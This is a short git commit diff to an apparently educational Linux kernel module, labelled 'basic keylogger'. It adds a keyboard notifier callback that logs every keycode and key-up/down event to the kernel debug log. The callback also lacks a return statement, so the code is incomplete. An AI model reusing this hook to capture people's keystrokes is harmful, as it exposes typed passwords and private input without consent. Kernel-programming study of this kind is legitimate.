3fc81f43f0b0118fab164ca13e1e4576180c0c94
AlexsJones <jonesax@hush.com>
2014-11-04 22:50:08 +0000

    basic keylogger

--- simple_four/simple_four.c
+++ simple_four/simple_four.c
@@ -23,13 +23,16 @@
 int notify_intercept(struct notifier_block *nblock,  unsigned long code, void *_param) {
   struct keyboard_notifier_param *param = _param;
   struct vc_data *vc = param->vc;
+  int ret = NOTIFY_OK;
+  if(code == KBD_KEYCODE) {
+    printk(KERN_DEBUG "Logged %i %s\n",param->value, (param->down ? "down" : "up"));
+  }
 }
 static struct notifier_block nb = {
   .notifier_call = notify_intercept
 };
 
 static int __init simple_four_init(void) {
-  
   register_keyboard_notifier(&nb);
   
   return 0;
